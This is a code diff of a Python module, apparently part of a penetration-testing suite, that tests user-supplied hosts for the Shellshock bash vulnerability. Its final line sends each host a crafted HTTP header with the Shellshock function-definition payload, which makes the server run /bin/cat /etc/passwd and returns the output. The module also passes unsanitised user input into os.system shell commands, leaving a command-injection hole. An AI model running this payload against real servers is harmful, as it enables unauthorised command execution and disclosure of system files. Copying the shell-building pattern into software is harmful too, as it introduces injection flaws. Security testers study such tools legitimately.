@@ -1,43 +1,50 @@
 ########################################################################################
 #                                                                                      #
-#                             MODULE FOR SHADOW SUITE                                  #
+#                       MODULE FOR SHADOW SUITE LINUX EDITION                          #
 #                                                                                      #
 ########################################################################################
 # Coding=UTF-8
 
-# Module version: 3.3
+# Module version: 5.0
 
 # Import directives
 try:
     import os
     import sys
+    import traceback
     from core import error
+    from core.logger import log
     import API
-    # Uncomment the line above if your module will use Shadow Suite's API.
 
     # Place your 'import' directives below
 
+    import_error = False
+
 except ImportError:
     print("[!] A module is missing! Please install the required modules...")
+    print("==================== TRACEBACK ====================")
+    traceback.print_exc()
+    print("===================================================")
+    import_error = True
 
 # Put your module information here.
 info = {
-        "name": "Shellshocker", # Module filename (Change this; I recommend you to use the filename as the module name.)
-        "version": "3.0", # version
+        "name": "ShellShocker", # Module filename (Change this; I recommend you to use the filename as the module name.)
+        "version": "4.0", # version
         "author": "NullArray", # Author
         "desc": "A bash script that tests [a list of] hosts for the shellshock vulnerability.", # Brief description
         "email": "none", # Email
-        "authorinfo": "Ported to Python 3 by Catayao56", # Additional information about the author; this could be
-        "lastupdate": "Mar. 21, 2018",                     # a website of the author.
+        "authorinfo": "Ported to Python 3 by Catayao56.", # Additional information about the author; this could be
+        "lastupdate": "Apr. 11, 2018",                     # a website of the author.
         # The date format is MONTH, DD, YYYY e.g.: Jan. 4, 2018
         "usingapi": "True", # Is this module using Shadow Suite's API?
         "needsroot": "1", # Does this module needs root permissions?
                                           # 0 == True; any number means false.
 }
-dependencies = ['none'] # Put needed dependencies here.  
+dependencies = ['BINARY: curl', 'BINARY: xargs', 'BINARY: cat'] # Put needed dependencies here.  
 
 # Changelog of the module
-changelog = "Version 2.0:\nPorted to Python by Catayao56\n\nVersion 1.0:\nInitial module release"
+changelog = "Version 4.0:\nMandatory module update\n\nVersion 3.0:\nMandatory bug fix\n\nVersion 2.0:\nPorted to Python by Catayao56\n\nVersion 1.0:\nInitial module release"
 # Changelog format:
 #
 # changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"
@@ -75,30 +82,33 @@ def module_info():
 
 # Main module function
 def main():
-    """ First, it checks the value assigned to the 'needsroot' variable in the 
-    dictionary 'info', then if the value is equal to zero, it calls the 'geteuid()'
-    function from the 'os' module. If the result from geteuid is also zero, then
-    the module will call the function 'module_body()'. Otherwise, it will print an
-    error message. If the value assigned to the 'needsroot' variable in the dictionary
-    'info' is not equal to zero, then the module will not call the 'geteuid()' function
-    from the 'os' module, and will immediately call 'module_body()' function. """
-    if info['needsroot'] == "0":
-        if os.geteuid() != 0:
-            print(error.error0005)
+    if import_error is True:
+        return None
+
+    else:
+        """ First, it checks the value assigned to the 'needsroot' variable in the 
+        dictionary 'info', then if the value is equal to zero, it calls the 'geteuid()'
+        function from the 'os' module. If the result from geteuid is also zero, then
+        the module will call the function 'module_body()'. Otherwise, it will print an
+        error message. If the value assigned to the 'needsroot' variable in the dictionary
+        'info' is not equal to zero, then the module will not call the 'geteuid()' function
+        from the 'os' module, and will immediately call 'module_body()' function. """
+        if info['needsroot'] == "0":
+            if os.geteuid() != 0:
+                print(error.error0005)
+                return 0
+
+            else:
+                module_body()
 
         else:
             module_body()
 
-    else:
-        module_body()
-
 def module_body():
-    # Place your program here. This is the function where your program will be placed.
-    # Remove module_info(), or leave it here. It's your call.
     print("Shellshocker :: Test [a list of] hosts for the shellshock vulnerability.\n")
     # cur_no_hosts is the current number of hosts entered.
-    # no_of_hosts is the target number of hosts needed. (RIP Grammar)
-    path_to_hosts = 'modules/shellshocker_hosts.temp'
+    # no_of_hosts is the target number of hosts needed.
+    path_to_hosts = 'output/shellshocker_hosts.temp'
     path_to_output = 'output'
     cur_no_hosts = 0
     no_of_hosts = input("How many hosts do you want to test? > ")
@@ -107,7 +117,7 @@ def module_body():
     while no_of_hosts != cur_no_hosts:
         TARGET = input("Target host > ")
         os.system("echo \'" + TARGET + "\' >> " + path_to_hosts)
-        cur_no_hosts = cur_no_hosts + 1
+        cur_no_hosts += 1
     output_name = input("Output filename > ")
     output = 'output/' + output_name
     os.system("cat " + path_to_hosts + " | xargs -I % bash -c \'curl % -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" && echo ----END OF RESPONSE----\' | tee " + output)
